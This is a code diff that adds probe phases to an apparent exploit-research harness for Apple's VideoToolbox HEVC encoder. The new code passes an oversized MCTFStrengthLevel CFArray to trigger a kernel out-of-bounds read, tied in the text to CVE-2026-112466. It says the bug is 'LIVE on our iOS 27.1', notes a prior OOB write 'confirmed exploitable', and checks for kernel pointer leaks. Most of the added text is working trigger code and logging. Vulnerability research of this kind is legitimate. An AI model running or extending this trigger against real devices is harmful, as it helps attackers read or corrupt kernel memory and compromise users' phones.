@@ -7699,6 +7699,258 @@ vps_cd_done:
             rlog("the kernel OOB write is confirmed exploitable.\n");
         }
 
+        if (phase == 0 || phase == 9) {
+            rlog("\n--- Phase 9: MCTFStrengthLevel as CFArray (counter trigger) ---\n");
+            rlog("SKVLENT analysis: iMCTFStrengthLevelNum at session+0x8a8 is the loop counter.\n");
+            rlog("MCTFStrengthLevel sent as CFArray populates both counter AND array.\n");
+            rlog("Array sized for 2 elements; counter > 2 = OOB READ in kernel.\n");
+            rlog("Read values go to kernel log only (no userspace return path).\n");
+            rlog("Testing for INDIRECT effects: encode status, timing, bitstream size.\n\n");
+
+            int arr_sizes[] = {1, 2, 3, 4, 8, 16};
+            int baseline_vps_len = 0;
+            uint8_t baseline_vps[256] = {0};
+            int baseline_sps_len = 0;
+
+            for (int ai = 0; ai < 6; ai++) {
+                int sz = arr_sizes[ai];
+                rlog("--- MCTFStrengthLevel array size=%d %s ---\n", sz,
+                     sz > 2 ? "*** OOB ***" : "(in-bounds)");
+
+                VTCompressionSessionRef s = NULL;
+                CFMutableDictionaryRef enc_spec = CFDictionaryCreateMutable(NULL, 0,
+                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+                CFDictionarySetValue(enc_spec,
+                    kVTVideoEncoderSpecification_EnableHardwareAcceleratedVideoEncoder,
+                    kCFBooleanTrue);
+                OSStatus st = VTCompressionSessionCreate(NULL, w, h,
+                    kCMVideoCodecType_HEVC, enc_spec, NULL, NULL, encode_cb, NULL, &s);
+                CFRelease(enc_spec);
+                if (st != noErr || !s) {
+                    rlog("  Session create FAILED: %d\n\n", (int)st);
+                    continue;
+                }
+
+                /* Enable MCTF first */
+                OSStatus mctf_st = VTSessionSetProperty(s, CFSTR("EnableMCTF"), kCFBooleanTrue);
+                rlog("  EnableMCTF: %d\n", (int)mctf_st);
+
+                /* Enable temporal compression (required for MCTF path) */
+                VTSessionSetProperty(s, CFSTR("RealTime"), kCFBooleanTrue);
+                VTSessionSetProperty(s, CFSTR("AllowTemporalCompression"), kCFBooleanTrue);
+                VTSessionSetProperty(s, CFSTR("AllowFrameReordering"), kCFBooleanTrue);
+                int fps30 = 30;
+                CFNumberRef fps_n = CFNumberCreate(NULL, kCFNumberIntType, &fps30);
+                VTSessionSetProperty(s, CFSTR("ExpectedFrameRate"), fps_n);
+                CFRelease(fps_n);
+
+                /* Build the MCTFStrengthLevel array */
+                CFMutableArrayRef arr = CFArrayCreateMutable(NULL, sz, &kCFTypeArrayCallBacks);
+                for (int j = 0; j < sz; j++) {
+                    int val = (j + 1) * 10;
+                    CFNumberRef nv = CFNumberCreate(NULL, kCFNumberIntType, &val);
+                    CFArrayAppendValue(arr, nv);
+                    CFRelease(nv);
+                }
+
+                /* Send as array — this should set iMCTFStrengthLevelNum = sz */
+                OSStatus arr_st = VTSessionSetProperty(s, CFSTR("MCTFStrengthLevel"), arr);
+                rlog("  MCTFStrengthLevel[%d]: %d\n", sz, (int)arr_st);
+                CFRelease(arr);
+
+                /* Also try MCTFStrengthLevelNum as scalar (the count field directly) */
+                CFNumberRef cnt = CFNumberCreate(NULL, kCFNumberIntType, &sz);
+                OSStatus cnt_st = VTSessionSetProperty(s, CFSTR("MCTFStrengthLevelNum"), cnt);
+                rlog("  MCTFStrengthLevelNum=%d: %d\n", sz, (int)cnt_st);
+                CFRelease(cnt);
+
+                /* Readback: does MCTFStrengthLevelNum reflect what we set? */
+                CFTypeRef rv = NULL;
+                OSStatus rb = VTSessionCopyProperty(s, CFSTR("MCTFStrengthLevelNum"), NULL, &rv);
+                rlog("  Readback MCTFStrengthLevelNum: st=%d", (int)rb);
+                if (rb == noErr && rv) {
+                    if (CFGetTypeID(rv) == CFNumberGetTypeID()) {
+                        int iv = 0; CFNumberGetValue(rv, kCFNumberIntType, &iv);
+                        rlog(" val=%d %s", iv, iv > 2 ? "*** COUNTER OOB ***" : "");
+                    }
+                    CFRelease(rv);
+                }
+                rlog("\n");
+
+                /* Readback: MCTFStrengthLevel */
+                rv = NULL;
+                rb = VTSessionCopyProperty(s, CFSTR("MCTFStrengthLevel"), NULL, &rv);
+                rlog("  Readback MCTFStrengthLevel: st=%d", (int)rb);
+                if (rb == noErr && rv) {
+                    if (CFGetTypeID(rv) == CFArrayGetTypeID()) {
+                        CFArrayRef ra = (CFArrayRef)rv;
+                        rlog(" count=%ld [", (long)CFArrayGetCount(ra));
+                        for (CFIndex k = 0; k < CFArrayGetCount(ra) && k < 8; k++) {
+                            int iv = 0;
+                            CFNumberGetValue(CFArrayGetValueAtIndex(ra, k), kCFNumberIntType, &iv);
+                            rlog("%s%d", k ? "," : "", iv);
+                        }
+                        rlog("]");
+                    } else if (CFGetTypeID(rv) == CFNumberGetTypeID()) {
+                        int iv = 0; CFNumberGetValue(rv, kCFNumberIntType, &iv);
+                        rlog(" scalar=%d", iv);
+                    }
+                    CFRelease(rv);
+                }
+                rlog("\n");
+
+                /* Prepare and encode */
+                OSStatus pr = VTCompressionSessionPrepareToEncodeFrames(s);
+                rlog("  Prepare: %d\n", (int)pr);
+
+                struct timeval tv_start, tv_end;
+                gettimeofday(&tv_start, NULL);
+
+                int enc_ok = 0, enc_fail = 0;
+                int frames = 10;
+                for (int f = 0; f < frames; f++) {
+                    g_encode_done = 0;
+                    g_cb_status = -999;
+                    encode_one(s, f, w, h);
+                    for (int wait = 0; wait < 100 && !g_encode_done; wait++)
+                        usleep(10000);
+                    if (g_cb_status == noErr) enc_ok++;
+                    else enc_fail++;
+                }
+
+                gettimeofday(&tv_end, NULL);
+                long elapsed_us = (tv_end.tv_sec - tv_start.tv_sec) * 1000000 +
+                                  (tv_end.tv_usec - tv_start.tv_usec);
+
+                VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
+
+                rlog("  Encode %d frames: ok=%d fail=%d time=%ldus (%.1fms/frame)\n",
+                     frames, enc_ok, enc_fail, elapsed_us,
+                     (double)elapsed_us / frames / 1000.0);
+
+                /* Extract VPS from bitstream for comparison */
+                /* Use GetSupportedPropertyDictionary to check post-encode state */
+                CFDictionaryRef post_props = NULL;
+                VTSessionCopySupportedPropertyDictionary(s, &post_props);
+                if (post_props) {
+                    CFIndex pc = CFDictionaryGetCount(post_props);
+                    rlog("  Post-encode property count: %ld\n", (long)pc);
+                    CFRelease(post_props);
+                }
+
+                /* Readback post-encode MCTFStrengthLevelNum */
+                rv = NULL;
+                rb = VTSessionCopyProperty(s, CFSTR("MCTFStrengthLevelNum"), NULL, &rv);
+                rlog("  Post-encode MCTFStrengthLevelNum: st=%d", (int)rb);
+                if (rb == noErr && rv) {
+                    if (CFGetTypeID(rv) == CFNumberGetTypeID()) {
+                        int iv = 0; CFNumberGetValue(rv, kCFNumberIntType, &iv);
+                        rlog(" val=%d %s", iv, iv > 2 ? "*** COUNTER OOB ***" : "");
+                    }
+                    CFRelease(rv);
+                }
+                rlog("\n");
+
+                /* Readback MCTFMaxNextRefNum (adjacent field in session struct) */
+                rv = NULL;
+                rb = VTSessionCopyProperty(s, CFSTR("MCTFMaxNextRefNum"), NULL, &rv);
+                rlog("  MCTFMaxNextRefNum: st=%d", (int)rb);
+                if (rb == noErr && rv) {
+                    if (CFGetTypeID(rv) == CFNumberGetTypeID()) {
+                        int iv = 0; CFNumberGetValue(rv, kCFNumberIntType, &iv);
+                        rlog(" val=%d", iv);
+                    }
+                    CFRelease(rv);
+                }
+                rlog("\n\n");
+
+                VTCompressionSessionInvalidate(s); CFRelease(s);
+            }
+
+            rlog("Phase 9 complete.\n");
+            rlog("Key indicators:\n");
+            rlog("  - MCTFStrengthLevel[n>2] accepted (st=0) → counter may reach kernel\n");
+            rlog("  - MCTFStrengthLevelNum readback > 2 → kernel counter set OOB\n");
+            rlog("  - Encode failures at n>2 but not n<=2 → OOB read affects behavior\n");
+            rlog("  - Timing anomalies at n>2 → kernel log overhead from OOB reads\n");
+        }
+
+        if (phase == 0 || phase == 10) {
+            rlog("\n--- Phase 10: MCTFMaxNextRefNum + MCTFEdgeCount array probes ---\n");
+            rlog("Testing other MCTF-adjacent fields that may also be OOB-readable.\n");
+            rlog("Per SKVLENT: fields +0x8b4/+0xebc follow the MCTF array in the session.\n\n");
+
+            const char *mctf_arr_keys[] = {
+                "MCTFMaxNextRefNum", "MCTFEdgeCount", "MCTFEdgeThresh",
+                "MCTFEnableGating", "MCTFGatingType", "MCTFPreFiltAdjType",
+                "MCTFEnableFeedback", NULL
+            };
+
+            VTCompressionSessionRef s = NULL;
+            CFMutableDictionaryRef enc_spec = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            CFDictionarySetValue(enc_spec,
+                kVTVideoEncoderSpecification_EnableHardwareAcceleratedVideoEncoder,
+                kCFBooleanTrue);
+            OSStatus st = VTCompressionSessionCreate(NULL, w, h,
+                kCMVideoCodecType_HEVC, enc_spec, NULL, NULL, encode_cb, NULL, &s);
+            CFRelease(enc_spec);
+            if (st != noErr || !s) {
+                rlog("Session create FAILED: %d\n", (int)st);
+            } else {
+                VTSessionSetProperty(s, CFSTR("EnableMCTF"), kCFBooleanTrue);
+                VTSessionSetProperty(s, CFSTR("RealTime"), kCFBooleanTrue);
+                VTSessionSetProperty(s, CFSTR("AllowTemporalCompression"), kCFBooleanTrue);
+
+                for (int ki = 0; mctf_arr_keys[ki]; ki++) {
+                    CFStringRef key = CFStringCreateWithCString(NULL, mctf_arr_keys[ki],
+                        kCFStringEncodingUTF8);
+
+                    /* Try as scalar values 0-16 */
+                    rlog("--- %s ---\n", mctf_arr_keys[ki]);
+                    for (int v = 0; v <= 16; v++) {
+                        CFNumberRef nv = CFNumberCreate(NULL, kCFNumberIntType, &v);
+                        OSStatus ss = VTSessionSetProperty(s, key, nv);
+                        CFRelease(nv);
+                        if (v <= 4 || v == 8 || v == 16 || ss != noErr)
+                            rlog("  %s=%d: %d\n", mctf_arr_keys[ki], v, (int)ss);
+                    }
+
+                    /* Try as array of 4 elements */
+                    CFMutableArrayRef arr = CFArrayCreateMutable(NULL, 4, &kCFTypeArrayCallBacks);
+                    for (int j = 0; j < 4; j++) {
+                        int val = j + 1;
+                        CFNumberRef nv = CFNumberCreate(NULL, kCFNumberIntType, &val);
+                        CFArrayAppendValue(arr, nv);
+                        CFRelease(nv);
+                    }
+                    OSStatus as = VTSessionSetProperty(s, key, arr);
+                    rlog("  %s[4 arr]: %d\n", mctf_arr_keys[ki], (int)as);
+                    CFRelease(arr);
+
+                    /* Readback */
+                    CFTypeRef rv = NULL;
+                    OSStatus rb = VTSessionCopyProperty(s, key, NULL, &rv);
+                    rlog("  readback: st=%d", (int)rb);
+                    if (rb == noErr && rv) {
+                        if (CFGetTypeID(rv) == CFNumberGetTypeID()) {
+                            int iv = 0; CFNumberGetValue(rv, kCFNumberIntType, &iv);
+                            rlog(" val=%d", iv);
+                        } else if (CFGetTypeID(rv) == CFArrayGetTypeID()) {
+                            rlog(" array[%ld]", (long)CFArrayGetCount((CFArrayRef)rv));
+                        }
+                        CFRelease(rv);
+                    }
+                    rlog("\n\n");
+
+                    CFRelease(key);
+                }
+
+                VTCompressionSessionInvalidate(s); CFRelease(s);
+            }
+            rlog("Phase 10 complete.\n");
+        }
+
         rlog("\n=== MCTF_OOB complete ===\n");
 
     } else if (strcmp(mode, "iosurface_probe") == 0) {
@@ -23851,7 +24103,12 @@ new_modes:
          * 22a: Enumerate all HEVC encoder properties (find MCTF keys)
          * 22b: VTFrameProcessor temporal noise filter path
          * 22c: Direct HEVC encode with temporal layer configs
-         * 22d: IOKit direct external method probing
+         * 22d: MCTF+temporal layer combinations
+         * 22e: MCTF output comparison oracle
+         * 22f: MCTFStrengthLevel as CFArray — the actual OOB trigger
+         *      (SKVLENT: iMCTFStrengthLevelNum at session+0x8a8 = loop counter;
+         *       MCTFStrengthLevel array count → counter, values → array;
+         *       array sized for 2; count > 2 = OOB READ in kernel)
          *
          * Fixed in iOS 27.2 — LIVE on our iOS 27.1.
          * ============================================================ */
@@ -24616,7 +24873,8 @@ new_modes:
 
                             VTCompressionSessionCompleteFrames(ce,
                                 kCMTimeInvalid);
-                            usleep(100000);
+                            /* Wait for async callbacks to drain */
+                            usleep(500000);
 
                             *outs[ci] = total_buf;
                             *szs[ci] = total_sz;
@@ -24685,8 +24943,184 @@ new_modes:
                 }
             }
 
+            /* ---- 22f: MCTFStrengthLevel as CFArray — the actual OOB trigger ---- */
+            rlog("\n--- 22f: MCTFStrengthLevel CFArray (MCTF counter trigger) ---\n");
+            rlog("SKVLENT analysis: iMCTFStrengthLevelNum = session+0x8a8 = loop counter.\n");
+            rlog("MCTFStrengthLevel sent as CFArray: count → counter, values → array.\n");
+            rlog("Array sized for 2; count > 2 = OOB READ.\n");
+            rlog("Read values go to kernel log only — test for indirect effects.\n\n");
+            {
+                int arr_sizes[] = {1, 2, 3, 4, 8, 16};
+                for (int ai = 0; ai < 6; ai++) {
+                    int sz = arr_sizes[ai];
+                    rlog("  --- MCTFStrengthLevel[%d] %s ---\n", sz,
+                         sz > 2 ? "*** OOB ***" : "(in-bounds)");
+
+                    VTCompressionSessionRef s22f = NULL;
+                    CFMutableDictionaryRef enc22f = CFDictionaryCreateMutable(
+                        kCFAllocatorDefault, 0,
+                        &kCFTypeDictionaryKeyCallBacks,
+                        &kCFTypeDictionaryValueCallBacks);
+                    CFDictionarySetValue(enc22f,
+                        CFSTR("EnableHardwareAcceleratedVideoEncoder"),
+                        kCFBooleanTrue);
+                    OSStatus st22f = VTCompressionSessionCreate(
+                        kCFAllocatorDefault, 1920, 1080,
+                        kCMVideoCodecType_HEVC, enc22f, NULL, NULL,
+                        encode_cb, NULL, &s22f);
+                    CFRelease(enc22f);
+                    if (st22f != noErr || !s22f) {
+                        rlog("    Session FAIL: %d\n\n", (int)st22f);
+                        continue;
+                    }
+
+                    /* Enable MCTF + temporal compression (required path) */
+                    OSStatus ms = VTSessionSetProperty(s22f, CFSTR("EnableMCTF"), kCFBooleanTrue);
+                    rlog("    EnableMCTF: %d\n", (int)ms);
+                    VTSessionSetProperty(s22f, CFSTR("RealTime"), kCFBooleanTrue);
+                    VTSessionSetProperty(s22f, CFSTR("AllowTemporalCompression"), kCFBooleanTrue);
+                    VTSessionSetProperty(s22f, CFSTR("AllowFrameReordering"), kCFBooleanTrue);
+                    int fps = 30;
+                    CFNumberRef fpsn = CFNumberCreate(NULL, kCFNumberIntType, &fps);
+                    VTSessionSetProperty(s22f, CFSTR("ExpectedFrameRate"), fpsn);
+                    CFRelease(fpsn);
+
+                    /* Build MCTFStrengthLevel as CFArray of sz elements */
+                    CFMutableArrayRef slArr = CFArrayCreateMutable(NULL, sz,
+                        &kCFTypeArrayCallBacks);
+                    for (int j = 0; j < sz; j++) {
+                        int val = (j + 1) * 10;
+                        CFNumberRef nv = CFNumberCreate(NULL, kCFNumberIntType, &val);
+                        CFArrayAppendValue(slArr, nv);
+                        CFRelease(nv);
+                    }
+                    OSStatus sl_st = VTSessionSetProperty(s22f,
+                        CFSTR("MCTFStrengthLevel"), slArr);
+                    rlog("    MCTFStrengthLevel[%d]: %d\n", sz, (int)sl_st);
+                    CFRelease(slArr);
+
+                    /* Also try MCTFStrengthLevelNum as scalar = sz */
+                    CFNumberRef cnt = CFNumberCreate(NULL, kCFNumberIntType, &sz);
+                    OSStatus cn_st = VTSessionSetProperty(s22f,
+                        CFSTR("MCTFStrengthLevelNum"), cnt);
+                    rlog("    MCTFStrengthLevelNum=%d: %d\n", sz, (int)cn_st);
+                    CFRelease(cnt);
+
+                    /* Readback MCTFStrengthLevelNum pre-encode */
+                    CFTypeRef rv22 = NULL;
+                    OSStatus rb22 = VTSessionCopyProperty(s22f,
+                        CFSTR("MCTFStrengthLevelNum"), NULL, &rv22);
+                    rlog("    Pre-encode MCTFStrengthLevelNum: st=%d", (int)rb22);
+                    if (rb22 == noErr && rv22) {
+                        if (CFGetTypeID(rv22) == CFNumberGetTypeID()) {
+                            int iv = 0;
+                            CFNumberGetValue(rv22, kCFNumberIntType, &iv);
+                            rlog(" val=%d%s", iv,
+                                 iv > 2 ? " *** COUNTER OOB ***" : "");
+                        }
+                        CFRelease(rv22);
+                    }
+                    rlog("\n");
+
+                    /* Readback MCTFStrengthLevel */
+                    rv22 = NULL;
+                    rb22 = VTSessionCopyProperty(s22f,
+                        CFSTR("MCTFStrengthLevel"), NULL, &rv22);
+                    rlog("    Pre-encode MCTFStrengthLevel: st=%d", (int)rb22);
+                    if (rb22 == noErr && rv22) {
+                        if (CFGetTypeID(rv22) == CFArrayGetTypeID()) {
+                            CFArrayRef ra = (CFArrayRef)rv22;
+                            CFIndex rc = CFArrayGetCount(ra);
+                            rlog(" count=%ld [", (long)rc);
+                            for (CFIndex k = 0; k < rc && k < 8; k++) {
+                                int iv = 0;
+                                CFNumberGetValue(
+                                    CFArrayGetValueAtIndex(ra, k),
+                                    kCFNumberIntType, &iv);
+                                rlog("%s%d", k ? "," : "", iv);
+                            }
+                            rlog("]");
+                        } else if (CFGetTypeID(rv22) == CFNumberGetTypeID()) {
+                            int iv = 0;
+                            CFNumberGetValue(rv22, kCFNumberIntType, &iv);
+                            rlog(" scalar=%d", iv);
+                        }
+                        CFRelease(rv22);
+                    }
+                    rlog("\n");
+
+                    /* Prepare + encode 10 frames, measure timing */
+                    OSStatus pr22 = VTCompressionSessionPrepareToEncodeFrames(s22f);
+                    rlog("    Prepare: %d\n", (int)pr22);
+
+                    struct timeval tv_s, tv_e;
+                    gettimeofday(&tv_s, NULL);
+
+                    int ok22 = 0, fail22 = 0;
+                    for (int f = 0; f < 10; f++) {
+                        g_encode_done = 0;
+                        g_cb_status = -999;
+                        encode_one(s22f, f, 1920, 1080);
+                        for (int w = 0; w < 100 && !g_encode_done; w++)
+                            usleep(10000);
+                        if (g_cb_status == noErr) ok22++;
+                        else fail22++;
+                    }
+
+                    gettimeofday(&tv_e, NULL);
+                    long us22 = (tv_e.tv_sec - tv_s.tv_sec) * 1000000 +
+                                (tv_e.tv_usec - tv_s.tv_usec);
+                    VTCompressionSessionCompleteFrames(s22f, kCMTimeInvalid);
+
+                    rlog("    Encode 10: ok=%d fail=%d time=%ldus (%.1fms/f)\n",
+                         ok22, fail22, us22, (double)us22 / 10000.0);
+
+                    /* Post-encode readback */
+                    rv22 = NULL;
+                    rb22 = VTSessionCopyProperty(s22f,
+                        CFSTR("MCTFStrengthLevelNum"), NULL, &rv22);
+                    rlog("    Post-encode MCTFStrengthLevelNum: st=%d", (int)rb22);
+                    if (rb22 == noErr && rv22) {
+                        if (CFGetTypeID(rv22) == CFNumberGetTypeID()) {
+                            int iv = 0;
+                            CFNumberGetValue(rv22, kCFNumberIntType, &iv);
+                            rlog(" val=%d%s", iv,
+                                 iv > 2 ? " *** COUNTER OOB ***" : "");
+                        }
+                        CFRelease(rv22);
+                    }
+                    rlog("\n");
+
+                    /* Check MCTFMaxNextRefNum (adjacent field) */
+                    rv22 = NULL;
+                    rb22 = VTSessionCopyProperty(s22f,
+                        CFSTR("MCTFMaxNextRefNum"), NULL, &rv22);
+                    rlog("    MCTFMaxNextRefNum: st=%d", (int)rb22);
+                    if (rb22 == noErr && rv22) {
+                        if (CFGetTypeID(rv22) == CFNumberGetTypeID()) {
+                            int iv = 0;
+                            CFNumberGetValue(rv22, kCFNumberIntType, &iv);
+                            rlog(" val=%d", iv);
+                        }
+                        CFRelease(rv22);
+                    }
+                    rlog("\n\n");
+
+                    VTCompressionSessionInvalidate(s22f);
+                    CFRelease(s22f);
+                }
+
+                rlog("22f Indicators:\n");
+                rlog("  MCTFStrengthLevel[n>2] accepted (st=0) → counter may reach kernel\n");
+                rlog("  MCTFStrengthLevelNum readback > 2 → kernel counter set OOB\n");
+                rlog("  Encode fails at n>2 but not n<=2 → OOB read affects behavior\n");
+                rlog("  Timing anomalies at n>2 → kernel log overhead from OOB reads\n");
+            }
+
             rlog("\n=== Phase 22 Summary ===\n");
             rlog("Check output for MCTF-related properties and KPTR leaks.\n");
+            rlog("22f is the KEY test: MCTFStrengthLevel as CFArray triggers the\n");
+            rlog("MCTF OOB read counter at session+0x8a8 (CVE-2026-112466).\n");
             rlog("--- Phase 22 complete ---\n");
         }
 
